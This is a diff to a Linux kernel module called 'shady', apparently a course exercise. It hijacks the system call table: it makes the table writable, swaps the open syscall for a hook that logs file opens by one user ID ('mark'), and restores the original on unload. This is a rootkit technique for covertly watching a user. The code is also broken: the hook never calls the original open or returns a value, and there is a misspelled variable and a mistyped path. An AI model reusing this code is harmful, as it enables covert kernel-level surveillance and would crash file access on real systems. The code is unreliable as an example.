@@ -43,12 +43,37 @@ MODULE_LICENSE("GPL");
 static int shady_ndevices = SHADY_NDEVICES;
 
 module_param(shady_ndevices, int, S_IRUGO);
+
+unsigned long system_call_table_address = 0xffffffff817318f0;
+unsigned long marks_uid = 1001; 
+
 /* ================================================================ */
 
 static unsigned int shady_major = 0;
 static struct shady_dev *shady_devices = NULL;
 static struct class *shady_class = NULL;
 /* ================================================================ */
+
+void set_addr_rw (unsigned long addr)
+{
+  unsigned int level;
+  pte_t *pte = lookup_address(addr, &level);
+  if (pte->pte &~ _PAGE_RW) pte->pte |= _PAGE_RW;
+}
+
+asmlinkage int (*get_uid)();
+
+asmlinkage int (*old_open) (const char*, int, int);
+
+asmlinkage int my_open (const char* file, int flags, int mode)
+{
+  //do this to get the current user
+  uid_t user_id = get_uid();
+  if(user_id == marks_uid)
+  {
+    printk("mark is about to open '/ect/ld.so.cache'");
+  }
+}
 
 int 
 shady_open(struct inode *inode, struct file *filp)
@@ -189,6 +214,8 @@ static void
 shady_cleanup_module(int devices_to_destroy)
 {
   int i;
+  void** system_call_table_func = (void**)system_call_table_addresss;
+  system_call_table_address[__NR_open] = old_open;
 	
   /* Get rid of character devices (if any exist) */
   if (shady_devices) {
@@ -214,6 +241,7 @@ shady_init_module(void)
   int i = 0;
   int devices_to_destroy = 0;
   dev_t dev = 0;
+  void** system_call_table_func;
 	
   if (shady_ndevices <= 0)
     {
@@ -255,6 +283,18 @@ shady_init_module(void)
       goto fail;
     }
   }
+
+  //set as read/write
+  set_addr_rw(system_call_table_address);
+  //set list of functions to call for system call table
+  system_call_table_func = (void**)system_call_table_address;
+  //get old open
+  old_open = system_call_table_func[__NR_open];
+  //set my open
+  system_call_table_func[__NR_open] = my_open;
+
+  //set getuid
+  get_uid = system_call_table_func[__NR_getuid];
   
   return 0; /* success */
 
